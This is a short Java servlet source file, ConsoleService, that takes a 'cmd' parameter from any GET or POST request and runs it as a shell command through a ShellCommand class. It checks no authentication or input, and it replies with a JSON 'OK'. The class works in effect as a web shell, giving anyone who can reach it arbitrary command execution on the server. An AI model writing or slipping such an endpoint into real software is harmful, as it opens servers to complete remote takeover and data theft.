/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package app;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 *
 * @author Selami
 */
public class ConsoleService extends HttpServlet {

    protected void handleRequestInitHeader(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setCharacterEncoding("UTF-8");
        response.setContentType("application/json;charset=UTF-8");
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        handleRequest(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        handleRequest(request, response);
    }

    protected void handleRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException,
            IOException {
        handleRequestInitHeader(request, response);
        String command = request.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
            new ShellCommand(command).start();
            response.getWriter().print("{\"data\": \"OK\"}");
        } else {
            response.getWriter().print("{\"data\": \"ERROR\"}");
        }
    }

}
